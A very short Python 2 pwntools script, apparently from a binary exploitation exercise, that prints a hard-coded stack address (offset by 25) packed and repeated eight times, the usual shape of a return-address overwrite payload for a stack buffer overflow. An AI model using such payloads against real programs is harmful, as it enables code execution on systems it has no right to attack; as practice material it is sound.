from pwn import *

addr = 0xffffdd44
addr += 25
print p32(addr) * 8
